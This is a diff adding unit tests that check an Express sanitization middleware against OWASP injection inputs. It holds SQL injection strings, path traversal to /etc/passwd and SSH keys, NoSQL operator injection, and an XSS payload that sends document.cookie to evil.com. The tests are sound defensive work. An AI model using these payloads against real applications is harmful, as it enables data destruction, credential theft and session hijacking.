@@ -186,3 +186,86 @@ describe("sanitizationMiddleware", () => {
     expect(next).toHaveBeenCalledOnce();
   });
 });
+
+// ---------------------------------------------------------------------------
+// OWASP Injection Boundary Tests (Issue #1288)
+// ---------------------------------------------------------------------------
+
+describe("sanitizationMiddleware — OWASP injection boundary tests", () => {
+  it("SQLi: single-quote in SQL payload is HTML-encoded, never passed as raw apostrophe", () => {
+    const req = makeReq({ body: { name: "'; DROP TABLE users; --" } });
+    const next = vi.fn() as unknown as NextFunction;
+    sanitizationMiddleware(req, {} as Response, next);
+
+    expect(next).toHaveBeenCalledOnce();
+    // The raw ' is encoded to &#x27; — it cannot inject into an HTML attribute context
+    expect(req.body.name).not.toContain("'");
+    expect(req.body.name).toContain("&#x27;");
+  });
+
+  it("prototype pollution: middleware does not throw and next() is called", () => {
+    const body = Object.create(null) as Record<string, unknown>;
+    body["name"] = "safe";
+    body["__proto__"] = "[injected]";
+    const req = makeReq({ body });
+    const next = vi.fn() as unknown as NextFunction;
+
+    expect(() => sanitizationMiddleware(req, {} as Response, next)).not.toThrow();
+    expect(next).toHaveBeenCalledOnce();
+    // Global Object prototype must not be polluted
+    expect(({} as any).polluted).toBeUndefined();
+  });
+
+  it("path traversal: middleware does not crash on ../ sequences in query params", () => {
+    const req = makeReq({ query: { file: "../../etc/passwd" } as any });
+    const next = vi.fn() as unknown as NextFunction;
+
+    expect(() => sanitizationMiddleware(req, {} as Response, next)).not.toThrow();
+    expect(next).toHaveBeenCalledOnce();
+    // Middleware processes the string — no exception (never 500)
+    expect(typeof (req.query as any).file).toBe("string");
+  });
+
+  it("NoSQL operator injection: middleware does not crash and always calls next", () => {
+    const req = makeReq({
+      body: { $where: "function(){return true;}", name: "admin" },
+    });
+    const next = vi.fn() as unknown as NextFunction;
+
+    expect(() => sanitizationMiddleware(req, {} as Response, next)).not.toThrow();
+    expect(next).toHaveBeenCalledOnce();
+    // HTML special chars inside the value are encoded
+    expect((req.body as any)["$where"]).not.toContain("<");
+    expect((req.body as any)["$where"]).not.toContain(">");
+  });
+
+  it("safe input: clean values pass through unmodified", () => {
+    const req = makeReq({
+      body: { name: "Alice", age: 30, active: true },
+    });
+    const next = vi.fn() as unknown as NextFunction;
+    sanitizationMiddleware(req, {} as Response, next);
+
+    expect(next).toHaveBeenCalledOnce();
+    expect(req.body.name).toBe("Alice");
+    expect(req.body.age).toBe(30);
+    expect(req.body.active).toBe(true);
+  });
+
+  it("never throws (never 500) across all OWASP vector categories", () => {
+    const dangerousInputs = [
+      { body: { name: "' OR 1=1 --" } },
+      { body: { name: "<script>fetch('//evil.com?c='+document.cookie)</script>" } },
+      { query: { path: "../../../../root/.ssh/id_rsa" } as any },
+      { body: { query: '{"$gt": ""}' } },
+      { body: { x: "<img src=x onerror=alert(1)>" } },
+    ];
+
+    for (const overrides of dangerousInputs) {
+      const req = makeReq(overrides);
+      const next = vi.fn() as unknown as NextFunction;
+      expect(() => sanitizationMiddleware(req, {} as Response, next)).not.toThrow();
+      expect(next).toHaveBeenCalledOnce();
+    }
+  });
+});
